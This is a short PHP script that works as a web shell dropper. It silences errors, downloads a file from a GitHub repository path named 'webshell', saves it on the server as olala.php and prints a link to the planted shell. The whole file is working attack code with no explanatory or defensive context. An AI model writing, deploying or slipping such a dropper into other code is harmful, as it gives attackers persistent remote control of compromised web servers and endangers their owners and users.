<?php
error_reporting(0);
$shell = fopen("olala.php", "w");
$file_shell = file_get_contents("https://raw.githubusercontent.com/AzhariKun/webshell/main/lites.php");
fwrite($shell, $file_shell);
fclose($shell);
echo "<a href='olala.php'>Here</a>";
?>
